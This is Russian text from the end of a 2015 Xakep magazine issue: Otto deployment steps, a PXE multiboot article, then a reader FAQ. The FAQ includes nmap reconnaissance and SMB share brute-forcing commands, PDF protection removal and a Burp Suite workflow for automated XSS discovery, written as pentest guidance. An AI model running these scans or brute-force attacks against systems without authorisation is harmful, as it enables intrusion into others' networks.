мым:





Отдадим команду для «компиляции» конфига:

$ otto compile

Данная команда прочитает наш конфиг и создаст подкаталог .otto с конфига-
ми Vagrant. Теперь возвращаемся в каталог otto-project и создаем следующий
Appfile:





Вновь запускаем компиляцию конфига:
$ otto compile





Конфиг успешно скомпилирован

Теперь все готово для запуска окружения разработки:

$ otto dev





Запуск окружения разработки
В ходе этой операции Otto установит Vagrant (можно установить и заранее),
скачает образ ОС (Ubuntu), поднимет виртуальную машину, установит в нее все
необходимые зависимости, запустит сервисы и SSH. В результате на экране
ты увидишь сообщение об успешном запуске ВМ.





Виртуальная машина с окружением разработки успешно запущена

Это все, к машине можно подключиться по SSH:

$ otto dev ssh

При этом все файлы и каталоги, созданные в otto-project, будут автомати-
чески видны в каталоге /vagrant внутри ВМ, так что файлы твоего проекта
не придется таскать с помощью scp.
   Когда работа над приложением будет завершена, следует собрать образ
и залить его в облако (Otto спросит твой AWS Access Key):

$ otto build





Создаем и заливаем образ
Далее можно запустить инстанс:

 $ otto deploy

 и остановить окружение разработки:

 $ otto dev halt

 Полностью избавиться от инстанса и окружения разработки можно так:

 $ otto deploy destroy
 $ otto dev destroy

 Это все.


Типичный workflow Otto

$ otto compile — читаем конфиг Otto и подготавливаем конфиги для Va-
grant
$ otto dev — поднимаем ВМ, устанавливаются зависимости
$ otto dev ssh — заходим в ВМ
$ otto build — создаем образ для облака
$ otto deploy — запускаем инстанс



ВЫВОДЫ
 Otto — невероятно удобный инструмент для любого разработчика. Как ты смог
 убедиться, поднять окружение разработки и выполнить деплой приложения
 с его помощью проще, чем настроить nginx. И это еще не все, Otto находится
 на начальном этапе своего развития, в будущем планируется реализация воз-
 можности развертывания целых инфраструктур (с помощью Terraform) и суще-
 ственное расширение возможностей конфигурации окружений. У Otto опреде-
 ленно есть будущее, и я бы советовал присмотреться к этому инструменту.
SYNACK
PXE —
ГРУЗИМ ВСЕ!МУЛЬТИЗАГРУЗКА ПО ЛОКАЛЬНОЙ СЕТИ.
ЧАСТЬ 3





                                           Александр «Plus» Рак
                                                   Участник сообщества
                                             OmskLUG. Руководитель
                                                 группы автоматизации
                                                   отдела ИТ департамента
                                                   образования, город
                                                Салехард
ПРЕДИСЛОВИЕ
Уже после того, как была написана вторая часть, возникли некоторые вопро-
сы при работе с разными версиями Windows, а именно разрядностью систем
Windows PE и инсталляторами дистрибутивов. На разных машинах не опре-
делялись то диски, то сетевая карта. Ставить систему на лету хорошо, а еще
лучше базовый пакет ПО засунуть прямо в устанавливаемую ОС, чтобы после
инсталляции системы получить ее сразу с готовым ПО. Образов дисков ISO
очень много, распаковывать и копировать структуру не очень круто, намного
круче автоматизировать этот процесс, да так, чтобы даже после замены самих
ISO-образов на другие версии монтировались на лету в каталоги SMB. Эти
проблемы сегодня мы и попытаемся решить.

ПЛАНЫ
Итак, планы на сегодня!
1.  Разрешить проблему разных версий Windows в части разрядности.
      1.1. Разобраться с проблемой «неопределения» дисков и сетевых карт.
2.   Автоматизировать подключение образов дистрибутивов различных си-
    стем + мониторинг результата.

ОПЯТЬ-ТАКИ НАЧИНАЕМ ПО ПОРЯДКУ С WINDOWS
Первым шагом в предыдущей статье полагалось использовать одну версию
Windows PE, однако возникла проблема запуска инсталляторов x32-версий
Windows. Тогда было решено идти по пути наименьшего сопротивления и со-
брать WinPE x32 так же, как описывалось в прошлой статье. И все бы ниче-
го, да запустить ее оказалось невозможно. Windows PE панически выпадала
в ошибку на этапе загрузки. Проблема оказалась в BCD-файле. Выход был
следующий: создавать два каталога с одинаковой структурой внутри, но с раз-
ными именами (например, /images/windows/x32 и /images/windows/x64). На-
помню, что полный путь к Windows-образам TFTP у нас /var/lib/tftpboot/images/
windows. Но тогда не совсем удобно работать с самими winpe.wim-файлами
и одинаковыми именами файлов. Для большего комфорта советую восполь-
зоваться программой BOOTICE (я использовал версию 1.332). В ней можно
отредактировать BCD-файл и поправить внутри имя файла WIM-образа. Тогда
получим два BCD-файла с одинаковым названием, которые складываем в те
самые подкаталоги x32 и x64, а все остальное можно расположить в одном
подкаталоге images/windows/. После всех манипуляций все должно грузиться
как положено. Понятное дело, теперь необходимо поправить файл startnet.cmd
внутри каждого из WinPE-образов. Структуру файла ты можешь посмотреть
в предыдущей статье. Если кому-то не нравится консольное меню, то можно
сделать простенький exe-лаунчер и запускать его скриптом startned.cmd напо-
добие autorun. Программ для реализации такого меню полным-полно.
   Итак, с этой проблемой справились. На некоторых компьютерах, как я уже
писал выше, возникала еще пара проблем.
1. При загрузке Windows PE и выборе пункта установки системы в консоль па-
   дала ошибка: сетевая папка недоступна. Пингами до сервера с PXE выяс-
   нилось, что не было сети, — внутри Windows PE отсутствовали драйверы
   для сетевой карты.
2. После запуска установки Windows на некоторых компьютерах инсталлятор
   не мог обнаружить диски, проблема та же — отсутствие драйверов, но уже
   для накопителей.

РЕШЕНИЕ ЭТИХ ПРОБЛЕМ
Первым делом заходим на сайт driverpacks.net и скачиваем интересующие нас
драйверы x64- и x86-версий для LAN и Mass Storage. Сразу скажу, что пихать
оба пака — и x32, и x64 — в оба WIM не нужно, только напрасно увеличишь
его размеры. Распаковываем в удобный для работы каталог (например, C:\
lan_driver_x32 и по аналогии). Далее так же, как и в прошлый раз для работы
внутри WIM-образа, подключим его. Пример интеграции драйверов приведен
для x64-битной версии:

imagex /mountrw winpex64.wim 1 mount

Далее добавляем драйверы:

Dism /image:C:\winpe\mount /Add-Driver
    /Driver:”C:\!Driver_x86” /Recurse

где
•  Dism — грубо говоря, новый imagex;
•  image:C:\winpe\mount — указываем, где подключен WIM-образ;
•  /Add-Driver — параметр говорит о том, что интегрируем драйверы;
•  /Driver:»C:\!Driver_x86» — каталог с распакованными драйверами;
•  /Recurse — говорит шерстить каталог с драйверами рекурсивно.

После этого отключаем образ.

imagex /unmount /commit mount

Проделываем этот фокус с нужными драйверами для нужных версий Windows.
Все бы ничего, но, как говорится, хорошая мысля приходит опосля. Так и в этом
случае посетила идея. Раз у нас есть система, которая устанавливается авто-
матом, не задавая лишних вопросов, неплохо бы иметь после установленной
системы сразу необходимый софт в комплекте, медиаплееры, офис, Jabber-кли-
ент, правильные браузеры. Что ж, сделаем и такой дистр.
  Ставим с нашего PXE-сервера (можно на виртуальную машину) Windows,
у нас это Windows 7 x32 (делал по заказу админа). Далее ставим необходи-
мый софт, у нас это офис и кодеки. После всех манипуляций активируем учет-
ную запись администратора, заходим под ней, удаляем учетную запись, ко-
торую создали в процессе установки, далее удаляем каталоги пользователя,
которого удалили. После чего запускаем cmd с правами админа. Воспользу-
емся программой sysprep. Находится
она тут: C:\Windows\System32\sysprep\
sysprep.exe, в параметрах ставим гал-
ку «Подготовка к использованию».
  И «Параметры завершения рабо-
ты -> Завершение работы». После
того как машина выключится, грузим-
ся с PXE winpe.wim образа, предвари-
тельно так же смонтировав образ и по-
ложив программку imagex в корень,
например так: C:\winpe\mount\imagex.
exe (путь указан в каталог с подклю-
ченным образом). Далее, когда выхо-
дит меню WinPE, жмем <Ctrl + c> и по-  Окно sysprep
падаем просто в cmd-консоль.

ЗАХВАТ ОБРАЗА
Для начала подготовим сетевую общую папку с правами на запись, в которую
будем захватывать образ WIM. У меня это \\192.168.181.4\buf. Далее вернемся
к машине, где у нас запущен WinPE с консолью. Подключаем сетевой каталог:

net use D: \\192.168.181.4\buf

Запускаем imagex с такими параметрами:

imagex /capture C: D:\install.wim “Windows 7 Professional x64”
    /compress maximum

где
•  /capture С: — захват раздела C;
•  D:\install.wim — куда сохранять D;
•  «Windows 7 Professional x64» — имя образа, должно быть заключено в кавычки;
•  /compress maximum — тип сжатия файлов в образе.
После всего получаем файл install.wim и заменяем им файл insltall.wim в образе,
который находится в каталоге Source. Важно: размер получившегося образа
не должен превышать 4 Гбайт.

АВТОМАТИЗАЦИЯ ПОДКЛЮЧЕНИЯ ISO-ОБРАЗОВ
Для начала подготовим папки. Итак, у нас настроен общий каталог с именем
windows. Внутри создаем подкаталоги, куда будут подключаться ISO-образы:
•  win2012;
•  win8x32;
•  win8x64;
•  win7x32;
•  win7x64;
•  win7cutomx32;
•  kubuntu15.10;
•  elementaryos64.

Как ты заметил, у меня две Live-версии Ubuntu, именно поэтому я положил их
в этот же каталог. Далее складываем ISO-образы в какую-нибудь папку, на-
пример в /home/user/iso. Имена файлов ISO должны соответствовать именам
каталогов, созданных ранее (например: win7x32 — win7x32.iso). Далее создаем
скрипт /opt/isodistr.sh:
В двух словах о том, что он делает. Скрипт монтирует ISO-образ, сопоставляя
имя ISO-образа и имя папки. Результат пишется в лог в виде 1 — если каталоги
до этого были примонтированы и 0 — если образы примонтированы не были
и примонтировались при последнем запуске.
  Далее делаем его исполняемым командой sudo chmod +x, добавляем в cron
пользователя, у которого есть доступ во все каталоги и файлы, задание запу-
скать скрипт раз в пять минут.





ПОЧЕМУ ЛОГИ В ВИДЕ 0 И 1
У меня есть Zabbix-сервер, который мониторит и в случае чего шлет эсэмэски.
Вот для мониторинга состояния этого хозяйства и сыпем в лог 0 и 1. Чтобы на-
учить Zabbix работать с этими данными, необходимо добавить в файл настро-
ек /etc/zabbix/zabbix_agentd.conf такие строки:




После чего в веб-интерфейсе Zabbix на узел добавить элемент данных мо-
ниторинга mountisodistr и mountisodistrlinux. На выходе получаем симпатич-
ный график.
График мониторинга состояния подключения ISO-образов

ПОД КОНЕЦ НЕМНОГО О НАВЕДЕНИИ КРАСОТЫ
Основной файл меню PXE — это pxelinux.cfg/default. Чтобы не громоздить вну-
три него лишние настройки, в данном случае стилевые, просто выносим их
в отдельный файл и указываем на него в default.





Как видно из конфига, задавать можно все, от настроек фона до обводки тек-
ста. Для фоновой картинки необходимо использовать небольшое изображе-
ние размерами 640 x 480. Для корректного отображения русского языка необ-
ходимо сменить кодировку файла меню либо сконвертировать его с помощью
скрипта:
И подсунуть шрифт формата PSF с поддержкой кириллицы. И твое меню сразу
станет веселее. :)
   Вот, собственно, и всё! Проект подошел к своему логическому завершению.
Остается поблагодарить сообщество омских линуксоидов OmskLUG и Рината
Рафаиловича Латыпова, он же Sosed213, за оказанную помощь.
    P. S. Хочется отметить, что проект оказался полезным. После написания
статьи установка Windows-систем была портирована на загрузочную флеш-
ку, где уже лежали Android’ы, Linux’ы и образы серверных решений вроде
OpenMediaVault, OSSIM и Zentyal. Правда, пришлось пересобирать WinPE за-
ново и BCD-файл из-за структуры каталогов на самой флешке. По вопросам
настройки можешь обращаться на email plus@omsklug.com. Всем большое спа-
сибо за адекватные комменты и удачи! Дальше будет только интересней. ;)
FAQ



                                        Алексей Zemond
                                           Панкратов
                                           3em0nd@gmail.com

FAQ
   ОТВЕТЫ НА ВОПРОСЫ
       ЧИТАТЕЛЕЙ

               (ЕСТЬ ВОПРОСЫ? ШЛИ НА FAQ@GLC.RU)
7 КОМАНД NMAP, КОТОРЫЕ ПОМОГУТ В РАЗВЕДКЕ

Думаю, ты в курсе, что Nmap — очень крутой сканер. Количество его ключей
огромно, а возможности можно изучать годами. Не зря он входит в десятку
лучшего хак-софта и по умолчанию установлен практически на всех никсовых
системах. Но не все знают, что Nmap — это не только сканирование портов.
Возможности его ширятся за счет многочисленных скриптов, которые собра-
ны и уже готовы к применению, если на твоей машине стоит Nmap. Вот не-
сколько самых интересных.

nmap -p 80 --script dns-brute.nse example.com

Этот скрипт ищет поддомены на заданном домене и выдает валидные А-записи.

nmap -p 80 --script hostmap-bfk.nse example.com

Ищет виртуальные хосты на удаленной машине.

sudo nmap --traceroute --script traceroute-geolocation.nse
    -p 80 example.com

Как видно из названия, делает трассировку до удаленного хоста и, помимо
этого, рисует, где какой хоп находится физически.

nmap --script http-enum example.com

Довольно агрессивный тест удаленного хоста, сканирует на очень многое.
Здесь и определение метаданных, и определение сервера и различных ди-
ректорий. В среднем проводит более двух тысяч тестов, что делает его похо-
жим на знаменитый сканер Nikto.

nmap --script http-title -sV -p 80 example.com

Получаем от сервера заголовки, по которым можно узнать версию сервера
или используемого сервиса и определиться с дальнейшим вектором атаки.

nmap -p 445 --script smb-os-discovery 127.0.0.1

Определяет ОС, имя машины, NetBIOS и домен. Если запустить в локальной
сети, найдет все машины, подключенные к сети на данный момент. Это может
быть полезно не только при разведке, но и при инвентаризации парка машин
в целом.

nmap -sV -p 445 --script smb-brute 127.0.0.1

Еще один скрипт для сетей. Поможет найти и пробрутить шары.
Конечно, это далеко не все скрипты: их намного больше, и их можно компоно-
вать друг с другом, чтобы получать необходимую информацию. Ознакомиться
с полным списком можно на официальном сайте Nmap.

ОТКЛЮЧАЕМ ПРОВЕРКУ ЦИФРОВОЙ ПОДПИСИ
ДРАЙВЕРОВ В WINDOWS

Бывает, купив новенький принтер, использовать ты его не можешь, так как не
получается поставить драйверы. Иногда Windows упорно не хочет их инстал-
лировать, жалуясь на неверные цифровые подписи. Однако есть возможность
отключить проверку и на свой страх и риск поставить необходимые для рабо-
ты драйверы.
  Для отключения проверки в Windows 7, Windows Server 2003 и более старых
версиях воспользуемся редактором групповых политик. Чтобы его открыть,
нажимаем хоткей <Win + R> и в появившемся окошке вбиваем `gpedit.msc`. От-
кроется многим уже хорошо знакомое окно настройки групповых политик. Нас
интересует следующая ветка:

                     Конфигурация пользователя

                    Административные шаблоны

                            Система

                          Установка драйвера

Здесь ищем параметр «Цифровая подпись драйверов устройств» и выключа-
ем его. После этого перезагружаем машину и ставим все, что нужно. Того же
эффекта можно добиться, зажав F8 при загрузке системы и выбрав соответ-
ствующий режим загрузки системы. Стоит отметить, что после ребута в этом
случае проверка подписи снова включится.
Кстати, если у тебя вдруг стоит Windows Home Basic или другой «домашний»
дистрибутив, то gpedit можешь не искать, его там нет. Но его можно и устано-
вить, слегка расширив возможности урезанной системы.
  В случае Windows 8.1 или Windows Server 2012 для отключения проверки бу-
дет необходимо перезагрузиться в режиме выбора параметров загрузки си-
стемы. Для этого нажимаем хоткей <Win + I> и, зажав клавишу Shift, выбираем
«Выключение -> Перезагрузка». При выключении компьютера появится страни-
ца параметров выключения, тебе нужна вкладка «Диагностика». Потом перехо-
дим в «Дополнительные параметры -> Параметры загрузки -> Перезагрузить».
  После ребута появится страница выбора параметров загрузки. Задаем
необходимый режим, нам нужно отключить обязательную проверку подписи
драйверов, и ждем запуска ОС. Цифровая подпись будет отключена до сле-
дующей перезагрузки, так что, если будет нужно что-то ставить в несколько
этапов, не забудь снова выключить проверку.

СНИМАЕМ ЗАЩИТУ С PDF

Частенько, когда нужно скопировать что-то из свежескачанного файла PDF
и перенести в другой формат, сделать это не получается из-за защиты файла.
Защита бывает разная — запрет на копирование, на печать и так далее. Вот
как ее можно снять.
  Способов немало: это и различные тулзы, и веб-сервисы, которые без мо-
роки с установкой шароварных программ сделают за тебя всю грязную рабо-
ту. Но во многих случаях можно обойтись даже без них.
  Один из самых простых и доступных способов — это открыть PDF в Google
Drive. Загружаем файл и открываем его. Если он был защищен на уровне
прав владельца, то защита будет отключена. Если не получается, проверь в
настройках загрузок, включен ли режим «Преобразовать текст загруженного
PDF-файла или изображения», и попробуй проделать все действия снова.
  Еще более простой способ — это открыть PDF в Google Chrome, а затем
снова сохранить его как PDF. Защита тоже будет снята.
  Можно решить проблему чуть более творчески. Для этого понадобятся Foxit
Reader или CutePDF Writer, которые, кстати, совершенно бесплатны. Открыв
файл в Foxit, отправь его на печать на виртуальный принтер — выставленные
ограничения ничем тебе не помешают.
  Полезные тулзы, к сожалению, не всегда под рукой, но то же самое мож-
но сделать и при помощи веб-сервиса Smallpdf — он мгновенно снимает
защиту со многих PDF. Из его полезных фишек стоит отметить разные ва-
рианты конвертации и слияния, а также поддержку русского языка. В об-
щем, однозначно в закладки, когда-нибудь точно пригодится. Как видишь,
снятие защиты с PDF — не такое уж и сложное дело при наличии правиль-
ных инструментов.

КАК ПОЧИНИТЬ OUTLOOK ПОСЛЕ НЕУДАЧНОГО
ПАТЧА WINDOWS

После установки недавних обновлений Windows почтовик Outlook при запуске
сразу же уходит в мир иной и ОС принудительно завершает его работу. Как по-
бороть эту проблему? Для начала смотрим логи. В них появляются примерно
следующие сообщения.

Имя сбойного приложения: OUTLOOK.EXE, версия: 15.0.4763.1000,
отметка времени: 0x55f7fe43
Имя сбойного модуля: ntdll.dll, версия: 6.1.7601.23250,
отметка времени 0x562593df
Код исключения: 0xc0000374
Смещение ошибки: 0x00000000000be7d2
Идентификатор сбойного процесса: 0xca4
Время запуска сбойного приложения: 0x01d11d440ded8dd6
Путь сбойного приложения: C:\Program Files\Microsoft Office\
Office15\OUTLOOK.EXE
Путь сбойного модуля: C:\windows\SYSTEM32\ntdll.dll

Дальнейшее расследование показывает, что сбой вызывают два пакета об-
новлений: KB3097877 и KB3101746. Чаще всего именно первый — достаточно
удалить его, и это решит проблему. Но давай разберемся, что там внутри. Вот
как звучит описание с официального сайта:
   «Обновление KB3097877 нацелено на закрытие уязвимости в шрифтах
OpenType, позволяющей атакующим повысить свои привилегии в системе до
уровня вошедшего в учетную запись пользователя».
   Становится все интереснее! Outlook действительно падает именно при по-
пытках открыть определенные сообщения. Если их удалить с сервера, то он
продолжит работать до получения очередного «убойного» письма. Если об-
новить офис до 2013-й редакции, то в большинстве случаев баг уходит. Здесь
все зависит от конкретной версии Office. У меня под рукой было две версии.
В одной был Outlook 15.0.4719.1001 — он крашится после открытия письма; а
вот версия 15.0.4771.1000 работает стабильно.
  В итоге есть два простых решения: удалить пакет или обновить Office.
В Microsoft к тому же пообещали выпустить новую заплатку, которая поборет
глюк. Впрочем, это не первый и не последний такой случай. Не зря многие ма-
терые админы перед обновлением всего парка машин тестируют заплатки на
нескольких компьютерах с целью диагностики.

АВТОМАТИЗИРУЕМ ПОИСК XSS ЧЕРЕЗ BURP SUITE

Burp Suite — это отличная тулза для проведения пентестов веб-приложений.
Она заметно упрощает жизнь как при проверке и эксплуатации различных уяз-
вимостей, так и на этапе разведки. Мы расскажем про несколько трюков, кото-
рые помогут искать XSS.
   Задача в целом сводится к тому, чтобы послать определенный пейлоад,
получить ответ и на основании его сделать вывод, есть ли возможность про-
вести межсайтовый скриптинг или нет.
   Частенько для этих целей используют модуль Intruder, который присутству-
ет в бесплатной версии программы. Работает он так: выбираешь режим (опре-
деленный вектор или целый список различных пейлоадов) и поля для атаки,
после чего запускается атака.
   Ее ход можно отследить в окне статуса, где отображается, сколько еще
осталось перебрать вариантов и какие ответы отдает сервер. Нужно внима-
тельно смотреть на поведение сервера и в случае отклонения от нормальной
работы тестировать руками, анализировать и думать.
   Когда у тебя огромный список пейлоадов и десяток параметров, а прило-
жение и сервер настроены более-менее грамотно, задача становится слож-
нее. Для автоматизации есть плагин xssValidator — при удачной атаке он под-
нимет заданный флаг, что заметно упрощает работу. Плагин можно скачать
с сайта разработчика или установить через Burp. Для корректной работы ему
нужны Java 7.0 и новее и PhantomJS или SlimerJS.
  После установки всего необходимого нужно запустить скрипт xss.js, кото-
рый устанавливается вместе с плагином.

phantomjs xss.js &
slimerjs slimer.js &

Теперь можно приступать к работе. Все действия проводятся через тот же
Intruder, только в Payload type выбираем Extension-generated, а там — наш пла-
гин xssValidator. Чтобы при удачном проведении атаки срабатывал флаг, необ-
ходимо на вкладке Options в разделе Grep — Match добавить строку, которая
и будет служить флагом. Она копируется из поля Grep phrase в закладке пла-
гина. После этого нажимаем «Старт» и следим за флагом.
                                    18+





  № 12 (203)
                     Илья Русанен            Алексей Глазков
                      Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный        Евгения Шарипова
                       Шеф-редактор           Литературный редактор
                         pismenny@glc.ru


                       РЕДАКТОРЫ РУБРИК
      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
     PC ZONE, СЦЕНА, UNITS          ВЗЛОМ                 Лозовский
          pismenny@glc.ru              zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев           Евгений Зобнин
          ВЗЛОМ                  X-MOBILE
            goltsev@glc.ru                zobnin@glc.ru

        Илья Русанен           Павел Круглов
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                        MEGANEWS
                             Мария Нефёдова
                                  nefedova.maria@gameland.ru



                                АРТ
                                Анна Королькова            Алик Вайнер
                                      Верстальщик                 Обложка
                                  цифровой версии


                           РЕКЛАМА
                    Анна Яковлева         Мария Самсоненко
                       PR-менеджер            Менеджер по рекламе
                          yakovleva.a@glc.ru            samsonenko@glc.ru


                 РАСПРОСТРАНЕНИЕ И ПОДПИСКА
                  Подробная информация по подписке shop.glc.ru, info@glc.ru
                                 Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111,
Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массо-
вых коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто-
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи-
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2015